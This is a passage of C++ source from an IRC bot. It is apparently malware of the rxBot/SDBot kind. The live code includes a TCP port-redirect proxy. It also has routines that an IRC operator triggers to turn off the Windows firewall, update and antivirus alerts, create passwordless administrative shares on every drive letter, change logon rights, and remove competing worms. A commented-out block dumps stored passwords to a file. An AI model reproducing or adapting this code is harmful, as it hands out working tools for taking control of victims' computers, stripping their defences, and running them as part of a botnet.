			if (GetSaveFileName(&ofn)==TRUE) {
			lstrcpy(SavingFname,ofn.lpstrFile);
			if(strstr(SavingFname,".htm")==0)lstrcat(SavingFname,".htm");			
			SaveToDisk(TableHeader);
			if(!iS9x){
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">Resource Name&nbsp;</font></b></td><td><b><font color=\"#FF0000\">Resource Type&nbsp;</font></b></td><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			EnumOutlookAccounts();
			EnumPStorage(TRUE);
			}
			else{
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			CashedPass(TRUE);						
			}
			SaveToDisk(Table);
			}
			break;
		case IDCANCEL:
			EndDialog(hDlg, LOWORD(wParam));
			ExitProcess(0);
			break;

		break;
		}
	}

    return FALSE;
}
//
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)

{	
	if((int)GetVersion() < 0) iS9x=TRUE;
	else iS9x=FALSE;
	if(lpCmdLine[0]==NULL){
	InitCommonControls();
	DialogBox(hInstance, (LPCTSTR)IDD_DIALGMAIN, 0, (DLGPROC)DLgProc);
	}
	else
	{
			lstrcpy(SavingFname,lpCmdLine);
			SaveToDisk(TableHeader);
			if(!iS9x){
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">Resource Name&nbsp;</font></b></td><td><b><font color=\"#FF0000\">Resource Type&nbsp;</font></b></td><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			EnumOutlookAccounts();
			EnumPStorage(TRUE);
			}
			else{
			SaveToDisk("<tr><td><b><font color=\"#FF0000\">User Name/Value</font></b></td><td><b><font color=\"#FF0000\">Password</font></b></td></tr>");			
			CashedPass(TRUE);			
			}
			SaveToDisk(Table);
			
	
	}

	return 0;
}
*/
#endif


#ifndef NO_REDIRECT

// part of the redirect function, handles sending/recieving for the local connection.
DWORD WINAPI redirectloop2(LPVOID param)
{
	SOCKET sock;
	SOCKET csock;
	int err;
	char buff[4096];
	NTHREAD redir = *((NTHREAD*)param);
	sock = redir.sock;
	csock = redir.csock;

	while (1) {
		ZeroMemory(buff,sizeof(buff));
		err = frecv(sock, buff, sizeof(buff), 0);
		if (err == 0)
			break;
		if (err == SOCKET_ERROR)
			break;
		err = fsend(csock, buff, err, 0);
		if (err == SOCKET_ERROR)
			break;
	}

	fclosesocket(csock);
	return 0;
}
// part of the redirect function, handles sending/recieving for the remote connection.
DWORD WINAPI redirectloop(LPVOID param)
{
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];

	NTHREAD redir = *((NTHREAD*)param);
	csock = redir.csock;
	dest = redir.data1;
	port = redir.idata2;
	DWORD id;

	while (1) {
		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		ZeroMemory(&ssin,sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(port);
		iaddr.s_addr = finet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE)
			hostent = fgethostbyname(dest);
		else
			hostent = fgethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL)
			break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR)
			break;

		redir.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&redir, 0, &id);

		while (1) {
			ZeroMemory(buff,sizeof(buff));
			err = frecv(csock, buff, sizeof(buff), 0);

			if (err == 0)
				break;

			if (err == SOCKET_ERROR)
				break;

			err = fsend(sock, buff, err, 0);
			if (err == SOCKET_ERROR)
				break;

		}

		break;
	}

	fclosesocket(csock);
	fclosesocket(sock);

	return 0;
}

// port redirect function
DWORD WINAPI RedirectThread(LPVOID param)
{
	NTHREAD redir = *((NTHREAD*)param);
	NTHREAD *redirs = (NTHREAD *)param;
	redirs->gotinfo = TRUE;
	//IRC* irc=(IRC*)redir.conn;

	SOCKET rsock, clsock;
	SOCKADDR_IN rssin, cssin;
	DWORD id;

	rsock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	fWSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	ZeroMemory(&rssin,sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = fhtons(redir.idata1);
	fbind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	threads[redir.threadnum].csock=rsock;
	while(1) {
		if (flisten(rsock, 10) == SOCKET_ERROR)
			break;
		clsock = faccept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redir.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redir, 0, &id);
		}
	}

	fclosesocket(clsock);
	fclosesocket(rsock);
	clearthread(redir.threadnum);
	ExitThread(0);
}
#endif


#ifndef NO_SECURE

char *stoplist[] = { "Tlntsvr",	"RemoteRegistry",	"Messenger", "SharedAccess",		 "wscsvc" };
char *stopnames[]= { "Telnet",	"Remote Registry",	"Messenger", "Windows Firewall/ICS", "Security Center" };

REGENT SecureReg[]={
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"UpdatesDisableNotify",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusOverride",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallOverride",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update",	"AUOptions",				REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\wscsvc",								"Start",					REG_DWORD,	0x00000004,	0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TlntSvr",								"Start",					REG_DWORD,	0x00000004, 0x00000003},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\RemoteRegistry",						"Start",					REG_DWORD,	0x00000004, 0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\Messenger",							"Start",					REG_DWORD,	0x00000004, 0x00000004},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Lsa",									"restrictanonymous",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",					"DoNotAllowXPSP2",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"Software\\Microsoft\\OLE",													"EnableDCOM",				REG_SZ,		0x00000000, 0x00000000, "N", "Y"},
	/*{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000}*/
};

NETSHARES ShareList[]={
	{(LPTSTR)L"IPC$",NULL},
	{(LPTSTR)L"ADMIN$",NULL},
	{(LPTSTR)L"C$",(LPTSTR)L"C:\\"},{(LPTSTR)L"D$",(LPTSTR)L"D:\\"},
	{(LPTSTR)L"E$",(LPTSTR)L"E:\\"},{(LPTSTR)L"F$",(LPTSTR)L"F:\\"},
	{(LPTSTR)L"G$",(LPTSTR)L"G:\\"},{(LPTSTR)L"H$",(LPTSTR)L"H:\\"},
	{(LPTSTR)L"I$",(LPTSTR)L"I:\\"},{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},
	{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},{(LPTSTR)L"K$",(LPTSTR)L"K:\\"},
	{(LPTSTR)L"L$",(LPTSTR)L"L:\\"},{(LPTSTR)L"M$",(LPTSTR)L"M:\\"},
	{(LPTSTR)L"N$",(LPTSTR)L"N:\\"},{(LPTSTR)L"O$",(LPTSTR)L"O:\\"},
	{(LPTSTR)L"P$",(LPTSTR)L"P:\\"},{(LPTSTR)L"Q$",(LPTSTR)L"Q:\\"},
	{(LPTSTR)L"R$",(LPTSTR)L"R:\\"},{(LPTSTR)L"S$",(LPTSTR)L"S:\\"},
	{(LPTSTR)L"T$",(LPTSTR)L"T:\\"},{(LPTSTR)L"U$",(LPTSTR)L"U:\\"},
	{(LPTSTR)L"V$",(LPTSTR)L"V:\\"},{(LPTSTR)L"W$",(LPTSTR)L"W:\\"},
	{(LPTSTR)L"X$",(LPTSTR)L"X:\\"},{(LPTSTR)L"Y$",(LPTSTR)L"Y:\\"},
	{(LPTSTR)L"Z$",(LPTSTR)L"Z:\\"}
};

void SecureRegistry(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;

	int written=0,failed=0;
	for(int i=0;i < (sizeof(SecureReg)/sizeof(*SecureReg));i++)
	{
		if (SecureReg[i].type==REG_DWORD)
		{
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].data1:SecureReg[i].data2)))
			{
				written++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
		}
		else if (SecureReg[i].type==REG_SZ)
		{
			written++;
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].sdata1:SecureReg[i].sdata2)))
			{
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
		}
	}
	if (written==0)
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Failed to %s Registry. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
	else
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Registry %s. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
}

void SecureShares(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
	char sendbuf[IRCLINE];
	char tmpBuffer[IRCLINE];
	int shdel=0;
	int shmake=0;

	if (secure)
	{
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;
			
		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",sec_title,"erased");

		do
		{
			nStatus=fNetShareEnum(NULL,502,(LPBYTE *)&pBuf,-1,&entriesread,&totalread,&resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA)
			{
				p = pBuf;
 
				for(unsigned int i=1;i <= entriesread;i++)
				{
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$')
					{
						if(fNetShareDel(NULL,(unsigned short *)p->shi502_netname,0) == NERR_Success)
						{
							if (!loop && !silent && verbose)
							{
								if (shdel>0)
									strcat(sendbuf,",");
								sprintf(tmpBuffer," %S",p->shi502_netname);
								strcat(sendbuf,tmpBuffer);
							}
							shdel++;
						}
					}
					p++;
				}
				fNetApiBufferFree(pBuf);
			}
			else
			{
				for(int i=0;i < (sizeof(ShareList)/sizeof(*ShareList));i++)
				{
					if(fNetShareDel(NULL,(unsigned short *)ShareList[i].ShareName,0) == NERR_Success)
					{
						if (!loop && !silent && verbose)
						{
							if (shdel>0)
								strcat(sendbuf,",");

							sprintf(tmpBuffer," %S",ShareList[i].ShareName);
							strcat(sendbuf,tmpBuffer);
						}
						shdel++;
					}
				}
			}
		} while (nStatus == ERROR_MORE_DATA);

		if (verbose && !loop && !silent)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","erased",shdel);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!loop && !silent && !verbose)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",sec_title,"erased",shdel);
			}
		}

	}
	else
	{ // Unsecure

		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",unsec_title,"created");

		NET_API_STATUS res;
		SHARE_INFO_2 p;
		DWORD parm_err = 0;
		for (int i=0;i < (sizeof(ShareList) / sizeof (*ShareList));i++)
		{
			p.shi2_netname = (unsigned short *)TEXT(ShareList[i].ShareName);   
			p.shi2_type = STYPE_DISKTREE;
			p.shi2_remark = (unsigned short *)TEXT("rofl");
			p.shi2_permissions = 0;
			p.shi2_max_uses = 4;
			p.shi2_current_uses = 0;
			p.shi2_path = (unsigned short *)TEXT(ShareList[i].SharePath);
			p.shi2_passwd = NULL;
			res=fNetShareAdd(NULL,2,(LPBYTE)&p,&parm_err);
			if(res==0)
			{
				if (!loop && !silent && verbose)
				{
					if (shmake>0)
						strcat(sendbuf,",");

					sprintf(tmpBuffer," %S",ShareList[i].ShareName);
					strcat(sendbuf,tmpBuffer);
				}
				shmake++;
			}
		}
		if (verbose && !loop && !silent)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","created",shmake);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!verbose && !silent && !loop)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",unsec_title,"created",shmake);
			}
//			addlog(MAINLOG,sendbuf);
		}
	}
	return;
}

void SecureServices(void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
	SERVICE_STATUS ssStatus; 
	SC_HANDLE schService;
	SC_HANDLE hServiceControl;
	DWORD fdwAccess; 
	DWORD fdwControl;
	// The required service object access depends on the control. 
	fdwControl = SERVICE_CONTROL_STOP;
	fdwAccess = SERVICE_STOP;
	int stopped=0;
	int stopsize=(sizeof(stoplist)/sizeof(LPTSTR));

//	char sendbuf[IRCLINE];
	for(int x=0;x<stopsize;x++)
	{
 		// Open a handle to the service.
		hServiceControl=fOpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		schService=fOpenService(hServiceControl,stoplist[x],SERVICE_ALL_ACCESS);
		if (schService == NULL)
		{
			DWORD dw = GetLastError();
			if ((int)dw == 1060)
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s The %s service does not exist.",sec_title,stopnames[x]);
		}
		else
		{ 
			if (fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
			{
				fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus);
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s %s service stopped.",sec_title,stopnames[x]);
				stopped++;
			}
			else
			{
				DWORD dw = GetLastError();
				if ((int)dw == 1062)
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s The %s service was not started.",sec_title,stopnames[x]);

				else
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s Failed to stop the %s service, error: <%d> %u",sec_title,stopnames[x],dw);
			}
		}
		fCloseServiceHandle(schService);
		fCloseServiceHandle(hServiceControl);
	}
	if (stopped==0)
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s No services stopped.",sec_title);
	}
	else
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s Total services stopped: %d",sec_title,stopped);
	}
}


DWORD WINAPI SecureThread(LPVOID param)
{
	NTHREAD secure = *((NTHREAD*)param);
	NTHREAD *secures = (NTHREAD *)param;
	secures->gotinfo = TRUE;

	if (secure.bdata2) //loop
	{
		while (1)
		{
			if (!noadvapi32)
			{
#ifndef NO_VIRUSREMOVE
				RemoveVirus(0,NULL,TRUE,TRUE,FALSE);
#endif
				SecureServices(NULL, 0, TRUE, FALSE, TRUE);
				SecureRegistry(TRUE, NULL, 0, TRUE, FALSE, TRUE);
				SecureShares(TRUE, NULL, 0, TRUE, FALSE, TRUE);

#ifndef NO_LSARESTRICT
				if (!noadvapi32lsa)
					SearchForPrivilegedAccounts(L"SeNetworkLogonRight",FALSE);
#endif
			}
			//WriteHostsFile(secure.secure, secure.sock, secure.chan, secure.notice, secure.silent, secure.verbose, secure.loop);
			Sleep(SECURE_DELAY);
		}
	}
	else
	{
		IRC* irc=(IRC*)secure.conn;
		if (!noadvapi32)
		{
			if (secure.bdata1)
			{
				SecureServices(irc,secure.target,secure.silent,secure.verbose,FALSE);
#ifndef NO_VIRUSREMOVE
				//RemoveVirus(secure.target,irc,FALSE,secure.silent,secure.verbose);
#endif
			}

#ifndef NO_LSARESTRICT
			if (!noadvapi32lsa) {
				DWORD dwRet;
				if ((dwRet = SearchForPrivilegedAccounts(L"SeNetworkLogonRight",(secure.bdata1?FALSE:TRUE))) > 0)
					irc->privmsg(secure.target,"%s %s SeNetworkLogonRights %s %d accounts in local system policy.", (secure.bdata1?sec_title:unsec_title), (secure.bdata1?"Removed":"Added"), (secure.bdata1?"from":"to"),dwRet);
				else
					irc->privmsg(secure.target,"%s Failed to %s SeNetworkLogonRights %s accounts in local system policy.",(secure.bdata1?sec_title:unsec_title),(secure.bdata1?"remove":"restore"),(secure.bdata1?"from any":"to"));
			}
#endif

			SecureRegistry(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
			SecureShares(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
		}
			
	}

/*
		} else {
//			sprintf(sendbuf,"%s Advapi32.dll could not be loaded, %s could not be %s.",(secure.secure?sec_title:unsec_title),(secure.secure?"registry, shares, and services":"registry and shares"),(secure.secure?"secured":"unsecured"));
//			if (!secure.silent) irc_privmsg(secure.sock,secure.chan,sendbuf,secure.notice);
//			addlog(MAINLOG,sendbuf);
		}
//		WriteHostsFile(secure.secure, secure.sock, secure.chan, secure.notice, secure.silent, secure.verbose, secure.loop);
	}
*/
	clearthread(secure.threadnum);
	ExitThread(0);
}

#ifndef NO_LSARESTRICT

LPWSTR AccountName[]={
	L"Administrators",
	L"Users"
};

void InitLsaString(PLSA_UNICODE_STRING LsaString, LPWSTR String)
{
	DWORD StringLength;

	if (String == NULL) {
		LsaString->Buffer = NULL;
		LsaString->Length = 0;
		LsaString->MaximumLength = 0;

		return;
	}

	StringLength = wcslen(String);
	LsaString->Buffer = String;
	LsaString->Length = (USHORT) StringLength * sizeof(WCHAR);
	LsaString->MaximumLength=(USHORT)(StringLength+1) * sizeof(WCHAR);

	return;
}

NTSTATUS SetPrivilegeOnAccount(LSA_HANDLE PolicyHandle, PSID AccountSid, LPWSTR PrivilegeName, BOOL bEnable)
{
	LSA_UNICODE_STRING PrivilegeString;
	InitLsaString(&PrivilegeString, PrivilegeName);

	return (bEnable)?(fLsaAddAccountRights(PolicyHandle,AccountSid,&PrivilegeString,1))
		:(fLsaRemoveAccountRights(PolicyHandle,AccountSid,FALSE,&PrivilegeString,1));
}

DWORD AddPrivilegeToAccount(LSA_HANDLE PolicyHandle, LPWSTR AccountName, LPWSTR PrivilegeName)
{
	DWORD total = 0;
	PLSA_TRANSLATED_SID2 ltsTranslatedSID2;
	PLSA_REFERENCED_DOMAIN_LIST lrdlDomainList;
	NTSTATUS ntsResult;

	LSA_UNICODE_STRING lucName;
	InitLsaString(&lucName, AccountName);

	if ((ntsResult = fLsaLookupNames2(PolicyHandle,0,1,&lucName,&lrdlDomainList,&ltsTranslatedSID2)) == ERROR_SUCCESS) {
		if (SetPrivilegeOnAccount(PolicyHandle,ltsTranslatedSID2->Sid,PrivilegeName, TRUE) == ERROR_SUCCESS)
			total++;
	}
	fLsaFreeMemory(ltsTranslatedSID2);
	fLsaFreeMemory(lrdlDomainList);

	return (total);
}

DWORD SearchForPrivilegedAccounts(LPWSTR PrivilegeName, BOOL bEnable)
{
	DWORD count = 0, total = 0;

	static SECURITY_QUALITY_OF_SERVICE sqos = {sizeof SECURITY_QUALITY_OF_SERVICE, SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE};
	static LSA_OBJECT_ATTRIBUTES lsaOA = {sizeof LSA_OBJECT_ATTRIBUTES, NULL, NULL, 0, NULL, &sqos};

	LSA_HANDLE PolicyHandle;
	NTSTATUS nts;
		
	if ((nts = fLsaOpenPolicy(NULL, &lsaOA, GENERIC_ALL | POLICY_VIEW_LOCAL_INFORMATION | POLICY_LOOKUP_NAMES, &PolicyHandle)) == ERROR_SUCCESS) {

		if (bEnable) {
			for (DWORD i=0; i < sizeof(AccountName) / sizeof(LPWSTR); i++)
				total += AddPrivilegeToAccount(PolicyHandle, AccountName[i],PrivilegeName);
		} else {
			void *buffer;

			LSA_UNICODE_STRING PrivilegeString;
			InitLsaString(&PrivilegeString, PrivilegeName);

			if ((nts = fLsaEnumerateAccountsWithUserRight(PolicyHandle, &PrivilegeString, &buffer, &count)) == ERROR_SUCCESS) {
				SID **psidArray = (SID **)buffer;
				for (DWORD i = 0; i < count; ++ i) {
					if (SetPrivilegeOnAccount(PolicyHandle, psidArray[i], PrivilegeName, FALSE) == ERROR_SUCCESS)
						total++;
				}

				if (buffer) fLsaFreeMemory(buffer);
				buffer = NULL;
			}// else
				//addlogv(MAINLOG,"%s Failed to enumerate LSA accounts.",sec_title);
		}

		fLsaClose(PolicyHandle);
	}// else
		//addlogv(MAINLOG,"%s Failed to open LSA system policy.",sec_title);

	return (total);
}

#endif


#ifndef NO_VIRUSREMOVE
const char *runkey1="Software\\Microsoft\\Windows\\CurrentVersion\\Run";

VIRUSES viruses[]=
{
	{HKEY_LOCAL_MACHINE,runkey1,"TaskMon",				"Mydoom.h",		"taskmon.exe"},	
	{HKEY_LOCAL_MACHINE,runkey1,"PandaAVEngine",		"Netsky.r",		"PandaAVEngine.exe"},	
	{HKEY_CURRENT_USER,	runkey1,"sysinfo.exe",			"Bagle.v",		"sysinfo.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"System MScvb",			"Sobig.c",		"mscvb32.exe"},
	{HKEY_CURRENT_USER,	runkey1,"System MScvb",			"Sobig.c",		"mscvb32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"windows auto update",	"W32.Blaster",	"MSBLAST.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"windows auto update",	"W32.Blaster.B","Penis32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Microsoft Inet Xp..",	"W32.Blaster.C","teekids.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"d3dupdate.exe",		"Bagle.a",		"bbeagle.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"ssate.exe",			"Bagle.j",		"irun4.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"ssate.exe",			"Bagle.k",		"winsys.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"rate.exe",				"Bagle.X",		"i11r54n4.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"System MScvb",			"Sobig.c",		"mscvb32.exe"},
	
	/*{HKEY_LOCAL_MACHINE,runkey1,"Mstorage",				"IRC Bot (Spy)","spoolv.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Windows Config",		"IRC Bot (Spy)","antivirus32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Windows User Starter",	"IRC Bot (Spy)","winuser32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"SMK32",				"IRC Bot (SD)",	"SMK32MGR.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"AVP32 uploaderplus",	"IRC Bot (SD)",	"AVP132.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Rofl in the 2k4",		"IRC Bot (SD)",	"rofl.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Dll8d AutoLoader",		"IRC Bot (SD)",	"dll8dsys.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Microsoft DLL Manager","IRC Bot (SD)",	"dllmngr.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Windows Inhjection Process","IRC Bot (SD)","nxmc.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"SysConfig",			"IRC Bot (SD)",	"wincfg32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Microsoft Synchronization ASST","IRC Bot (SD)","winav.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"filename.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"syswin.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"iexplore.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"svhost.exe"},
	{NULL,NULL,NULL,NULL,NULL}*/
};

void RemoveVirus(char *target,void *conn,BOOL loop,BOOL silent,BOOL verbose)
{
	IRC* irc=(IRC*)conn;
	char sysdir[MAX_PATH], virusexecutable[MAX_PATH];
	int viriireg=0,viriikill=0,viriidel=0;
	int viriifound=0;
	int viriisize=(sizeof(viruses)/sizeof(VIRUSES));

	for (unsigned int i=0; i<viriisize; i++)
	{
		char *treg=RegQuery(viruses[i].hkey,viruses[i].subkey,viruses[i].value);
		if (treg)
		{
			viriifound++;
			if (RegDelete(viruses[i].hkey,viruses[i].subkey,viruses[i].value))
			{
				viriireg++;
				if (!loop && !silent && verbose)
					irc->privmsg(target,"%s Removed registry key for virus: %s",sec_title,viruses[i].name);
			}

#ifndef NO_PROCESS
			if (KillProcess(viruses[i].file,0))
			{
				viriikill++;
				if (!loop && !silent && verbose)
